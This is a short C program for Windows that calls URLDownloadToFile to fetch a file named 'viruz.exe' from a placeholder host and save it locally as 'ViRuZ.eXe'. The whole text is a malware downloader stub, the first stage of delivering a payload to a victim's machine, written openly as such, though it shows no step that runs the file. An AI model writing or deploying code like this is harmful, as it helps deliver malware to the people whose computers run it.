#include <urlmon.h>
#pragma comment(lib,"urlmon.lib")
 
int main()
{
     URLDownloadToFile(NULL,"www.site.com/viruz.exe","ViRuZ.eXe",0,NULL);
}
